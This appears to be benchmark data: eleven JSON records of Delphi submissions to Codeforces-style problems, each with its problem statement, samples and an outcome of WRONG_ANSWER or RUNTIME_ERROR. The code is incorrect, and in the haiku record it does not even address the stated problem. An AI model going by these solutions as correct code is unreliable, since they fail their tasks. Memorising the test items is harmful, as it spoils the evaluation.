{"difficulty":900,"lang":"Delphi","lang_cluster":"delphi","src_uid":"439_A","submission_id":"8415091","tags":["greedy","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"{$APPTYPE CONSOLE}\r\nuses SysUtils;\r\nvar n,m,i,j,l,k,s,x:longint;\r\nbegin\r\n  s:=0;\r\n  readln(n,m);\r\n  for i:=1 to n do\r\n  begin\r\n    read(x);\r\n    s:=s+x;\r\n  end;\r\n  s:=s+(n-1)*10;\r\n  k:=(n-1)*2;\r\n  if ((m-s) mod 5=0) then\r\n  begin\r\n    writeln(k+(m-s) div 5);\r\n    halt;\r\n  end;\r\n  writeln(-1);\r\nend.\r\n ","description":"Devu is a renowned classical singer. He is invited to many big functions\/festivals. Recently he was invited to \"All World Classical Singing Festival\". Other than Devu, comedian Churu was also invited.Devu has provided organizers a list of the songs and required time for singing them. He will sing n songs, i^th song will take ti minutes exactly. The Comedian, Churu will crack jokes. All his jokes are of 5 minutes exactly.People have mainly come to listen Devu. But you know that he needs rest of 10 minutes after each song. On the other hand, Churu being a very active person, doesn't need any rest.You as one of the organizers should make an optimal s\u0441hedule for the event. For some reasons you must follow the conditions:  The duration of the event must be no more than d minutes;  Devu must complete all his songs;  With satisfying the two previous conditions the number of jokes cracked by Churu should be as many as possible. If it is not possible to find a way to conduct all the songs of the Devu, output -1. Otherwise find out maximum number of jokes that Churu can crack in the grand event.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space separated integers n, d (1\u2264n\u2264100;\u00a01\u2264d\u226410000). The second line contains n space-separated integers: t1,t2,...,tn (1\u2264ti\u2264100).\n","output_spec":"If there is no way to conduct all the songs of Devu, output -1. Otherwise output the maximum number of jokes that Churu can crack in the grand event.\n","notes":"Consider the first example. The duration of the event is 30 minutes. There could be maximum 5 jokes in the following way:\n  First Churu cracks a joke in 5 minutes.  Then Devu performs the first song for 2 minutes.  Then Churu cracks 2 jokes in 10 minutes.  Now Devu performs second song for 2 minutes.  Then Churu cracks 2 jokes in 10 minutes.  Now finally Devu will perform his last song in 1 minutes.  Total time spent is 5+2+10+2+10+1=30 minutes.\nConsider the second example. There is no way of organizing Devu's all songs. Hence the answer is -1. \n","sample_inputs":["3 30\n2 2 1\n","3 20\n2 1 1\n"],"sample_outputs":["5\n","-1\n"]}
{"difficulty":1300,"lang":"Delphi","lang_cluster":"delphi","src_uid":"54_A","submission_id":"495144","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project1;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar\r\n  n,c,k,f,s,i,j:integer;\r\n  proverka:boolean;\r\n  a:array [1..365] of integer;\r\n\r\nbegin\r\n    read (n);\r\n    readln (k);\r\n    read (c);\r\n    for i:=1 to c do\r\n    begin\r\n        read(f);\r\n        a[i]:=f;\r\n    end;\r\n    i:=1;\r\n    j:=0;\r\n    s:=0;\r\n    while j<=n+k do\r\n    begin\r\n      if (j>=a[i]) and (i<=c) then\r\n      begin\r\n           j:=a[i];\r\n           inc(i);\r\n      end;\r\n      j:=j+k;\r\n  if j>=n+k then break;\r\n      inc(s);\r\n    end;\r\n    writeln (s);\r\n\r\n\r\nend.","description":"The Hedgehog likes to give presents to his friend, but no less he likes to receive them.Having received another present today, the Hedgehog suddenly understood that he has no place to put it as there was no room left on the special shelf in the cupboard. He will have to choose another shelf, but which one should he choose, how large should it be?In order to get to know this, the Hedgehog asks you to write him a program that will count the estimated number of presents that he will receive during the following N days. Besides, he is guided by the principle:   on each holiday day the Hedgehog will necessarily receive a present,  he receives presents at least every K days (i.e., if he received a present on the i-th day, he will receive the next present no later than on the i+K-th day).  For the given N and K, as well as the list of holidays among the following N days count the minimal number of presents that could be given to the Hedgehog. The number of today's day is zero, and you should regard today's present as already given (i.e., you shouldn't count it in the answer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integers N and K (1\u2264N\u2264365, 1\u2264K\u2264N).\nThe second line contains a number C which represents the number of holidays (0\u2264C\u2264N). Then in the same line follow C numbers ranging from 1 to N which are the numbers of holiday days. The numbers are given in the increasing order, without repeating numbers among them.\n","output_spec":"Print a single number \u2014 the minimal number of presents the Hedgehog will receive over the following N days.\n","notes":null,"sample_inputs":["5 2\n1 3\n","10 1\n3 6 7 8\n"],"sample_outputs":["3","10"]}
{"difficulty":1300,"lang":"Delphi","lang_cluster":"delphi","src_uid":"66_A","submission_id":"2410344","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"program codeforces;\r\n\r\n{$APPTYPE CONSOLE}\r\n{$R+ Q+ I+}\r\n\r\nuses\r\n  SysUtils;\r\nvar\r\n  i: integer;\r\n  f: boolean;\r\n  x: int64;\r\n  s,s1,s2: string;\r\nbegin\r\n  read(s);\r\n  f:=false;\r\n  s1:='9223372036854775807';\r\n  s2:='-9223372036854775808';\r\n  if (length(s)>length(s1)) or (length(s)>length(s1)) then begin\r\n    write('BigInteger');\r\n    halt;\r\n  end;\r\n  if length(s)=length(s1) then\r\n    for i:=1 to length(s) do\r\n      if strtoint(s[i])<=strtoint(s1[i]) then continue else begin f:=true;break; end;\r\n  if length(s)=length(s2) then\r\n    for i:=2 to length(s) do\r\n      if strtoint(s[i])<=strtoint(s1[i]) then continue else begin f:=true;break; end;\r\n  if f then begin\r\n    write('BigInteger');\r\n    halt;\r\n  end;\r\n  x:=strtoint64(s);\r\n  if (x<=127) and (x>=-128) then write('byte')\r\n  else if ((x>127) and (x<=32767)) or ((x<-128) and (x>=-32768)) then write('short')\r\n  else if ((x>32767) and (x<=strtoint64('2147483647'))) or ((x<-32768) and (x>=strtoint64('-2147483648'))) then write('int')\r\n  else if ((x>strtoint64('2147483647')) and (x<=strtoint64('9223372036854775807'))) or ((x<strtoint64('-2147483648')) and (x>=strtoint64('-9223372036854775808'))) then write('long');\r\nend.","description":"Little Petya has recently started attending a programming club. Naturally he is facing the problem of choosing a programming language. After long considerations he realized that Java is the best choice. The main argument in favor of choosing Java was that it has a very large integer data type, called BigInteger.But having attended several classes of the club, Petya realized that not all tasks require using the BigInteger type. It turned out that in some tasks it is much easier to use small data types. That's why a question arises: \"Which integer type to use if one wants to store a positive integer n?\"Petya knows only 5 integer types:1) byte occupies 1 byte and allows you to store numbers from -128 to 1272) short occupies 2 bytes and allows you to store numbers from -32768 to 327673) int occupies 4 bytes and allows you to store numbers from -2147483648 to 21474836474) long occupies 8 bytes and allows you to store numbers from -9223372036854775808 to 92233720368547758075) BigInteger can store any integer number, but at that it is not a primitive type, and operations with it are much slower.For all the types given above the boundary values are included in the value range.From this list, Petya wants to choose the smallest type that can store a positive integer n. Since BigInteger works much slower, Peter regards it last. Help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive number n. It consists of no more than 100 digits and doesn't contain any leading zeros. The number n can't be represented as an empty string.\nPlease, do not use %lld specificator to read or write 64-bit integers in C++. It is preffered to use cout (also you may use %I64d).\n","output_spec":"Print the first type from the list \"byte, short, int, long, BigInteger\", that can store the natural number n, in accordance with the data given above.\n","notes":null,"sample_inputs":["127\n","130\n","123456789101112131415161718192021222324\n"],"sample_outputs":["byte\n","short\n","BigInteger\n"]}
{"difficulty":1100,"lang":"Delphi","lang_cluster":"delphi","src_uid":"719_A","submission_id":"20932863","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar\r\n  n, i: integer;\r\n  a: array[1..100]of integer;\r\nbegin\r\n  readln(n);\r\n  for i := 1 to n do\r\n    read(a[i]);\r\n   if(n = 1)then\r\n     if(a[n] = 0)then\r\n       writeln('UP')\r\n     else if(a[n] = 15)then\r\n       writeln('DOWN')\r\n     else begin\r\n       writeln(-1);\r\n       halt(0);\r\n     end;\r\n  if(a[n] > a[n - 1])and(a[n] <> 15)then\r\n    writeln('UP')\r\n  else if(a[n] > a[n - 1])and(a[n] = 15)then\r\n    writeln('DOWN')\r\n  else if(a[n] < a[n - 1])and(a[n] <> 0)then\r\n    writeln('DOWN')\r\n  else\r\n    writeln('UP');\r\n  readln;\r\n  readln;\r\nend.\r\n\r\n ","description":"Every summer Vitya comes to visit his grandmother in the countryside. This summer, he got a huge wart. Every grandma knows that one should treat warts when the moon goes down. Thus, Vitya has to catch the moment when the moon is down.Moon cycle lasts 30 days. The size of the visible part of the moon (in Vitya's units) for each day is 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, and then cycle repeats, thus after the second 1 again goes 0.As there is no internet in the countryside, Vitya has been watching the moon for n consecutive days and for each of these days he wrote down the size of the visible part of the moon. Help him find out whether the moon will be up or down next day, or this cannot be determined by the data he has.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains a single integer n (1\u2264n\u226492)\u00a0\u2014 the number of consecutive days Vitya was watching the size of the visible part of the moon. \nThe second line contains n integers ai (0\u2264ai\u226415)\u00a0\u2014 Vitya's records.\nIt's guaranteed that the input data is consistent.\n","output_spec":"If Vitya can be sure that the size of visible part of the moon on day n+1 will be less than the size of the visible part on day n, then print \"DOWN\" at the only line of the output. If he might be sure that the size of the visible part will increase, then print \"UP\". If it's impossible to determine what exactly will happen with the moon, print -1.\n","notes":"In the first sample, the size of the moon on the next day will be equal to 8, thus the answer is \"UP\".\nIn the second sample, the size of the moon on the next day will be 11, thus the answer is \"DOWN\".\nIn the third sample, there is no way to determine whether the size of the moon on the next day will be 7 or 9, thus the answer is -1.\n","sample_inputs":["5\n3 4 5 6 7\n","7\n12 13 14 15 14 13 12\n","1\n8\n"],"sample_outputs":["UP\n","DOWN\n","-1\n"]}
{"difficulty":800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"78_A","submission_id":"3642248","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar\r\n  s:string;\r\n  i,n,k,k1,j:Integer;\r\nbegin\r\n  Readln(n);\r\n  k1:=0;\r\n  for i:=1 to n do\r\n    begin\r\n      Str(i,s);\r\n          k:=0;\r\n          for j:=1 to Length(s) do\r\n            if (s[j]<>'1') and (s[j]<>'0') then\r\n              begin\r\n                Inc(k);\r\n                Break;\r\n              end;\r\n          if (k=0) then Inc(k1);\r\n    end;\r\n  write(k1);\r\n  Readln;\r\n  Readln;\r\nend.\r\n ","description":"Haiku is a genre of Japanese traditional poetry.A haiku poem consists of 17 syllables split into three phrases, containing 5, 7 and 5 syllables correspondingly (the first phrase should contain exactly 5 syllables, the second phrase should contain exactly 7 syllables, and the third phrase should contain exactly 5 syllables). A haiku masterpiece contains a description of a moment in those three phrases. Every word is important in a small poem, which is why haiku are rich with symbols. Each word has a special meaning, a special role. The main principle of haiku is to say much using a few words.To simplify the matter, in the given problem we will consider that the number of syllable in the phrase is equal to the number of vowel letters there. Only the following letters are regarded as vowel letters: \"a\", \"e\", \"i\", \"o\" and \"u\".Three phases from a certain poem are given. Determine whether it is haiku or not.","input_from":"standard input","output_to":"standard output","input_spec":"The input data consists of three lines. The length of each line is between 1 and 100, inclusive. The i-th line contains the i-th phrase of the poem. Each phrase consists of one or more words, which are separated by one or more spaces. A word is a non-empty sequence of lowercase Latin letters. Leading and\/or trailing spaces in phrases are allowed. Every phrase has at least one non-space character. See the example for clarification.\n","output_spec":"Print \"YES\" (without the quotes) if the poem is a haiku. Otherwise, print \"NO\" (also without the quotes).\n","notes":null,"sample_inputs":["on  codeforces \nbeta round is running\n   a rustling of keys \n","how many gallons\nof edo s rain did you drink\n                                cuckoo\n"],"sample_outputs":["YES","NO"]}
{"difficulty":1300,"lang":"Delphi","lang_cluster":"delphi","src_uid":"96_B","submission_id":"7914749","tags":["binary+search","bitmasks","brute+force"],"exec_outcome":"WRONG_ANSWER","source_code":"program zad_96B;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\nvar\r\n  n, res, num, step1 : int64;\r\n  i, bit : integer;\r\n\r\nfunction getkol(num : int64):boolean;\r\n  var\r\n    kol, kol1 : integer;\r\n  begin\r\n    kol := 0;\r\n    kol1 := 0;\r\n    while(num <> 0) do begin\r\n      if(num mod 10 = 7) then\r\n        inc(kol)\r\n      else\r\n        inc(kol1);\r\n      num := num div 10;\r\n    end;\r\n    if(kol = kol1) then\r\n      getkol := true\r\n    else\r\n      getkol := false;\r\n  end;\r\nbegin\r\n  readln(n);\r\n\r\n  res := 0;\r\n  for bit := 0 to 2047 do begin\r\n    step1 := 1;\r\n    num := 0;\r\n    for i := 1 to 10 do begin\r\n      if(num >= n) then\r\n        break;\r\n      if(step1 and bit = step1) then\r\n        num := num * 10 + 4\r\n      else\r\n        num := num * 10 + 7;\r\n      step1 := step1 * 2;\r\n    end;\r\n    if (res = 0) or ((num >= n) and (num < res)) and (getkol(num)) then\r\n      res := num;\r\n  end;\r\n\r\n  writeln(res);\r\n\r\n  readln(n);\r\nend.\r\n","description":"Petya loves lucky numbers. Everybody knows that positive integers are lucky if their decimal representation doesn't contain digits other than 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Lucky number is super lucky if it's decimal representation contains equal amount of digits 4 and 7. For example, numbers 47, 7744, 474477 are super lucky and 4, 744, 467 are not.One day Petya came across a positive integer n. Help him to find the least super lucky number which is not less than n.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains a positive integer n (1\u2264n\u226410^9). This number doesn't have leading zeroes.\n","output_spec":"Output the least super lucky number that is more than or equal to n.\nPlease, do not use the %lld specificator to read or write 64-bit integers in C++. It is preferred to use the cin, cout streams or the %I64d specificator.\n","notes":null,"sample_inputs":["4500\n","47\n"],"sample_outputs":["4747\n","47\n"]}
{"difficulty":800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"9_A","submission_id":"6947550","tags":["math","probabilities"],"exec_outcome":"WRONG_ANSWER","source_code":"var y,w,max,i,p:integer;\r\nbegin\r\n     read(y);\r\n     readln(w);\r\n     p:=0;\r\n     if y>w then max:=y else max:=w;\r\n     for i:=1 to 6 do\r\n     if (i>=max) then inc(p);\r\n     if p=2 then writeln('1\/3')\r\n     else if p=3 then writeln('1\/2')\r\n     else if p=0 then writeln('0\/1')\r\n     else if p=6 then writeln('1\/1')\r\n     else writeln(p,'\/6');\r\nend.","description":"Yakko, Wakko and Dot, world-famous animaniacs, decided to rest from acting in cartoons, and take a leave to travel a bit. Yakko dreamt to go to Pennsylvania, his Motherland and the Motherland of his ancestors. Wakko thought about Tasmania, its beaches, sun and sea. Dot chose Transylvania as the most mysterious and unpredictable place.But to their great regret, the leave turned to be very short, so it will be enough to visit one of the three above named places. That's why Yakko, as the cleverest, came up with a truly genius idea: let each of the three roll an ordinary six-sided die, and the one with the highest amount of points will be the winner, and will take the other two to the place of his\/her dreams.Yakko thrown a die and got Y points, Wakko \u2014 W points. It was Dot's turn. But she didn't hurry. Dot wanted to know for sure what were her chances to visit Transylvania.It is known that Yakko and Wakko are true gentlemen, that's why if they have the same amount of points with Dot, they will let Dot win.","input_from":"standard input","output_to":"standard output","input_spec":"The only line of the input file contains two natural numbers Y and W \u2014 the results of Yakko's and Wakko's die rolls.\n","output_spec":"Output the required probability in the form of irreducible fraction in format \u00abA\/B\u00bb, where A \u2014 the numerator, and B \u2014 the denominator. If the required probability equals to zero, output \u00ab0\/1\u00bb. If the required probability equals to 1, output \u00ab1\/1\u00bb. \n","notes":"Dot will go to Transylvania, if she is lucky to roll 4, 5 or 6 points.\n","sample_inputs":["4 2\n"],"sample_outputs":["1\/2\n"]}
{"difficulty":2200,"lang":"Delphi","lang_cluster":"delphi","src_uid":"11_D","submission_id":"2497138","tags":["bitmasks","dp","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"var\r\ni,j,l,v,e,q1,q2 :longint;\r\nans,k:int64;\r\nf:array[0..22,0..22] of longint;\r\nbegin\r\n\/\/Assign(input,'input.txt');Reset(input);\r\n \/\/Assign(output,'output.txt');Rewrite(output);\r\nReadln(v,e);\r\n for i:=1 to e do\r\n  begin\r\n   Read(q1,q2);\r\n   f[q1][q2]:=1;\r\n   f[q2][q1]:=1;\r\n  end;\r\nfor i:=1 to v do\r\n for j:=i+1 to v do\r\n  for l:=j+1 to v do\r\n   if(f[i][j]=1)and(f[j][l]=1)and(f[i][l]=1)then inc(ans);\r\ndec(ans);\r\nk:=ans;\r\nfor i:=2 to k do\r\n inc(ans, (1+(k - i + 1))*(k - i + 1)div 2 );\r\nWriteln(ans);\r\n\/\/Close(input);Close(output);\r\nend.","description":"Given a simple graph, output the number of simple cycles in it. A simple cycle is a cycle with no repeated vertices or edges.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains two integers n and m (1\u2264n\u226419, 0\u2264m) \u2013 respectively the number of vertices and edges of the graph. Each of the subsequent m lines contains two integers a and b, (1\u2264a,b\u2264n, a\u2260b) indicating that vertices a and b are connected by an undirected edge. There is no more than one edge connecting any pair of vertices.\n","output_spec":"Output the number of cycles in the given graph.\n","notes":"The example graph is a clique and contains four cycles of length 3 and three cycles of length 4.\n","sample_inputs":["4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4\n"],"sample_outputs":["7\n"]}
{"difficulty":1600,"lang":"Delphi","lang_cluster":"delphi","src_uid":"131_D","submission_id":"2790598","tags":["dfs+and+similar","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"Var rez,a,b,kol,i,n:longint;\r\nk,z,e,m:array [1..10000]  of longint;\r\nused:array [1..10000] of Boolean;\r\nf:boolean;\r\nprocedure dfs1(v,k:longint);\r\nVar i:longint;\r\nbegin\r\n  inc(rez);\r\n  if used[v]\r\n  then begin\r\n        f:=True;\r\n        exit;\r\n       end;\r\n  i:=e[v];\r\n  while i<>0 do\r\n  begin\r\n    if (m[i]<>k)and(not f)\r\n    then begin\r\n          dfs1(m[i],v);\r\n         end;\r\n    i:=z[i];\r\n  end;\r\n  if f\r\n  then exit;\r\n  dec(rez);\r\nend;\r\n\r\nprocedure dfs(v,k:longint);\r\nVar i:longint;\r\nbegin\r\n  if used[v]\r\n  then begin\r\n        f:=True;\r\n        exit;\r\n       end;\r\n  used[v]:=true;\r\n  i:=e[v];\r\n  while i<>0 do\r\n  begin\r\n    if (m[i]<>k)and(not f)\r\n    then begin\r\n          dfs(m[i],v);\r\n         end;\r\n    i:=z[i];\r\n  end;\r\n  if f\r\n  then Exit;\r\n  used[v]:=false;\r\nend;\r\nprocedure add(i,j:longint);\r\nbegin\r\n  inc(kol);\r\n  m[kol]:=j;\r\n  z[kol]:=e[i];\r\n  e[i]:=kol;\r\nend;\r\nbegin\r\n \/\/ Assign(input,'input.txt');\r\n\/\/  Assign(output,'output.txt');\r\n  Readln(n);\r\n  kol:=0;\r\n  for i:=1 to n do\r\n  begin\r\n    readln(a,b);\r\n    add(a,b);\r\n    add(b,a);\r\n  end;\r\n  for i:=1 to n do\r\n  begin\r\n    f:=false;\r\n    FillChar(used,SizeOf(used),false);\r\n    dfs(i,i);\r\n    if f\r\n    then Break;\r\n  end;\r\n  for i:=1 to n do\r\n  if used[i]=false\r\n  then begin\r\n        rez:=-1;\r\n        f:=False;\r\n        dfs1(i,i);\r\n        k[i]:=rez;\r\n       end;\r\n  for i:=1 to n do\r\n  write(k[i],' ');\r\nend.\r\n","description":"A subway scheme, classic for all Berland cities is represented by a set of n stations connected by n passages, each of which connects exactly two stations and does not pass through any others. Besides, in the classic scheme one can get from any station to any other one along the passages. The passages can be used to move in both directions. Between each pair of stations there is no more than one passage.Berland mathematicians have recently proved a theorem that states that any classic scheme has a ringroad. There can be only one ringroad. In other words, in any classic scheme one can find the only scheme consisting of stations (where any two neighbouring ones are linked by a passage) and this cycle doesn't contain any station more than once.This invention had a powerful social impact as now the stations could be compared according to their distance from the ringroad. For example, a citizen could say \"I live in three passages from the ringroad\" and another one could reply \"you loser, I live in one passage from the ringroad\". The Internet soon got filled with applications that promised to count the distance from the station to the ringroad (send a text message to a short number...).The Berland government decided to put an end to these disturbances and start to control the situation. You are requested to write a program that can determine the remoteness from the ringroad for each station by the city subway scheme.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (3\u2264n\u22643000), n is the number of stations (and trains at the same time) in the subway scheme. Then n lines contain descriptions of the trains, one per line. Each line contains a pair of integers xi,yi (1\u2264xi,yi\u2264n) and represents the presence of a passage from station xi to station yi. The stations are numbered from 1 to n in an arbitrary order. It is guaranteed that xi\u2260yi and that no pair of stations contain more than one passage. The passages can be used to travel both ways. It is guaranteed that the given description represents a classic subway scheme.\n","output_spec":"Print n numbers. Separate the numbers by spaces, the i-th one should be equal to the distance of the i-th station from the ringroad. For the ringroad stations print number 0.\n","notes":null,"sample_inputs":["4\n1 3\n4 3\n4 2\n1 2\n","6\n1 2\n3 4\n6 4\n2 3\n1 3\n3 5\n"],"sample_outputs":["0 0 0 0 ","0 0 0 1 1 2 "]}
{"difficulty":2600,"lang":"Delphi","lang_cluster":"delphi","src_uid":"13_D","submission_id":"293544","tags":["dp","geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"program solution;\r\n\r\n{$APPTYPE CONSOLE}\r\n{MODE DELPHI}\r\n{$MAXSTACKSIZE 1000000000}\r\n{O-,R+,Q+}\r\n{$O+,R-,Q-}\r\n\r\nuses\r\n  SysUtils,\r\n  Math;\r\n\r\ntype\r\n  tp = record\r\n    x, y : int64;\r\n  end;\r\n  tl = record\r\n    a, b, c : int64;\r\n  end;\r\n\r\nvar\r\n  n, m, ans, i, j, z : integer;\r\n  t : tp;\r\n  l : tl;\r\n  a, b : array[0..501] of tp;\r\n  f : array[0..501, 0..501] of integer;\r\n\r\nfunction zn(a : int64) : integer;\r\nbegin\r\n  if a < 0 then begin\r\n    result := -1;\r\n    exit;\r\n  end;\r\n  if a = 0 then begin\r\n    result := 0;\r\n    exit;\r\n  end;\r\n  result := 1;\r\nend;\r\n\r\nfunction getline(var a, b : tp) : tl;\r\nbegin\r\n  result.a := a.y - b.y;\r\n  result.b := b.x - a.x;\r\n  result.c := a.x * b.y - b.x * a.y;\r\nend;\r\n\r\nfunction dist(var l : tl; var p : tp) : int64;\r\nbegin\r\n  result := l.a * p.x + l.b * p.y + l.c;\r\nend;\r\n\r\nfunction more(var a, b : tp) : boolean;\r\nbegin\r\n  result := a.x > b.x;\r\nend;\r\n\r\nbegin\r\n  \/\/assign(input, 'input.txt'); reset(input);\r\n  \/\/assign(output, 'output.txt'); rewrite(output);\r\n  read(n, m);\r\n  for i := 1 to n do\r\n    read(a[i].x, a[i].y);\r\n  for i := 1 to m do\r\n    read(b[i].x, b[i].y);\r\n  for i := 1 to n - 1 do\r\n    for j := n downto i + 1 do\r\n      if more(a[i], a[j]) then begin\r\n        t := a[i];\r\n        a[i] := a[j];\r\n        a[j] := t;\r\n      end;\r\n  for i := 1 to m - 1 do\r\n    for j := m downto i + 1 do\r\n      if more(b[i], b[j]) then begin\r\n        t := b[i];\r\n        b[i] := b[j];\r\n        b[j] := t;\r\n      end;\r\n  for i := 1 to n - 1 do\r\n    for j := i + 1 to n do begin\r\n      l := getline(a[i], a[j]);\r\n      for z := 1 to m do\r\n        if (b[z].x >= a[i].x) and (b[z].x <= a[j].x) and (zn(dist(l, b[z])) = 1) then\r\n          inc(f[i, j]);\r\n    end;\r\n  ans := 0;\r\n  for i := 1 to n - 2 do\r\n    for j := i + 1 to n - 1 do\r\n      for z := j + 1 to n do\r\n        if f[i, j] + f[j, z] - f[i, z] = 0 then\r\n          inc(ans);\r\n  writeln(ans);\r\nend.\r\n","description":"Little Petya likes to draw. He drew N red and M blue points on the plane in such a way that no three points lie on the same line. Now he wonders what is the number of distinct triangles with vertices in red points which do not contain any blue point inside.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two non-negative integer numbers N and M (0\u2264N\u2264500, 0\u2264M\u2264500) \u2014 the number of red and blue points respectively. The following N lines contain two integer numbers each \u2014 coordinates of red points. The following M lines contain two integer numbers each \u2014 coordinates of blue points. All coordinates do not exceed 10^9 by absolute value.\n","output_spec":"Output one integer \u2014 the number of distinct triangles with vertices in red points which do not contain any blue point inside.\n","notes":null,"sample_inputs":["4 1\n0 0\n10 0\n10 10\n5 4\n2 1\n","5 5\n5 10\n6 1\n8 6\n-6 -7\n7 -1\n5 -1\n10 -4\n-10 -8\n-10 5\n-2 -8\n"],"sample_outputs":["2\n","7\n"]}
{"difficulty":1700,"lang":"Delphi","lang_cluster":"delphi","src_uid":"140_A","submission_id":"4387453","tags":["geometry","math"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project1;\r\n{$APPTYPE CONSOLE}\r\nuses  SysUtils;\r\n\r\nvar Rv,rm, r, n,alfa: Extended;\r\n    f: Boolean;\r\n\r\nbegin\r\n  { TODO -oUser -cConsole Main : Insert code here }\r\n  f:=False;\r\n  Readln(n,rv,rm);\r\n  alfa:=Pi\/n;\r\n  if  Rv>rm then\r\n    if (rm\/(rv-rm))<Sin(alfa) then f:=True;\r\n  if  (n=1)and(Rv >=rm) then f:=True\r\n    else\r\n    if  (n=2)and(Rv >= 2*rm) then f:=True\r\n    else\r\n        if  Rv>rm then\r\n          if (rm\/(rv-rm))<Sin(alfa) then f:=True;\r\n\r\nif  f then Writeln('YES') else Writeln('NO');\r\n\r\n\r\nend.\r\n","description":"Gerald is setting the New Year table. The table has the form of a circle; its radius equals R. Gerald invited many guests and is concerned whether the table has enough space for plates for all those guests. Consider all plates to be round and have the same radii that equal r. Each plate must be completely inside the table and must touch the edge of the table. Of course, the plates must not intersect, but they can touch each other. Help Gerald determine whether the table is large enough for n plates.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers n, R and r (1\u2264n\u2264100, 1\u2264r,R\u22641000) \u2014 the number of plates, the radius of the table and the plates' radius.\n","output_spec":"Print \"YES\" (without the quotes) if it is possible to place n plates on the table by the rules given above. If it is impossible, print \"NO\".\nRemember, that each plate must touch the edge of the table. \n","notes":"The possible arrangement of the plates for the first sample is: \n \n","sample_inputs":["4 10 4\n","5 10 4\n","1 10 10\n"],"sample_outputs":["YES\n","NO\n","YES\n"]}
{"difficulty":1800,"lang":"Delphi","lang_cluster":"delphi","src_uid":"145_B","submission_id":"2387835","tags":["constructive+algorithms"],"exec_outcome":"WRONG_ANSWER","source_code":"{$R+,Q+,I+}\r\n{$apptype console}\r\nUses SysUtils;\r\nVar\r\n   a1,a2,a3,a4,i:Integer;\r\n   ans:String;\r\nBegin\r\n   Read(a1,a2,a3,a4);\r\n   If a3=a4 Then Begin\r\n      If (a1>=a3) and (a1>=a4) and (a2>=a3) and (a2>=a4) Then Begin\r\n         ans:='';\r\n         If a1>=a3+1 Then Begin\r\n            For i:=1 To a1-a3 Do ans:=ans+'4';\r\n            For i:=1 To a3-1 Do ans:=ans+'7'+'4';\r\n            For i:=1 To a2-a4+1 Do ans:=ans+'7';\r\n            ans:=ans+'4';\r\n         End\r\n         Else If a2>=a4+1 Then Begin\r\n            For i:=1 To a4-1 Do ans:=ans+'7'+'4';\r\n            For i:=1 To a2-a4+1 Do ans:=ans+'7';\r\n            For i:=1 To a1-a3 Do ans:=ans+'4';\r\n         End\r\n         Else ans:='-1';\r\n      End\r\n      Else ans:='-1';\r\n   End\r\n   Else If a3=a4-1 Then Begin\r\n      If (a1>=a3) and (a1>=a4) and (a2>=a4) and (a2>=a3) Then Begin\r\n         ans:='7';\r\n         For i:=1 To a1-a3 Do ans:=ans+'4';\r\n         For i:=1 To a4-2 Do ans:=ans+'7'+'4';\r\n         For i:=1 To a2-a4+1 Do ans:=ans+'7';\r\n         ans:=ans+'4';\r\n      End\r\n      Else ans:='-1';\r\n   End\r\n   Else If a3=a4+1 Then Begin\r\n      If (a1>=a3) and (a1>=a4) and (a2>=a4) and (a2>=a3) Then Begin\r\n         ans:='4';\r\n         For i:=1 To a1-a3 Do ans:=ans+'4';\r\n         For i:=1 To a4 Do ans:=ans+'7'+'4';\r\n         For i:=1 To a2-a4 Do ans:=ans+'7';\r\n      End\r\n      Else ans:='-1';\r\n   End\r\n   Else ans:='-1';\r\n   Write(ans);\r\nEnd.","description":"Petya loves lucky numbers very much. Everybody knows that lucky numbers are positive integers whose decimal record contains only the lucky digits 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Petya loves long lucky numbers very much. He is interested in the minimum lucky number d that meets some condition. Let cnt(x) be the number of occurrences of number x in number d as a substring. For example, if d=747747, then cnt(4)=2, cnt(7)=4, cnt(47)=2, cnt(74)=2. Petya wants the following condition to fulfil simultaneously: cnt(4)=a1, cnt(7)=a2, cnt(47)=a3, cnt(74)=a4. Petya is not interested in the occurrences of other numbers. Help him cope with this task.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains four integers a1, a2, a3 and a4 (1\u2264a1,a2,a3,a4\u226410^6).\n","output_spec":"On the single line print without leading zeroes the answer to the problem \u2014 the minimum lucky number d such, that cnt(4)=a1, cnt(7)=a2, cnt(47)=a3, cnt(74)=a4. If such number does not exist, print the single number \"-1\" (without the quotes).\n","notes":null,"sample_inputs":["2 2 1 1\n","4 7 3 1\n"],"sample_outputs":["4774\n","-1\n"]}
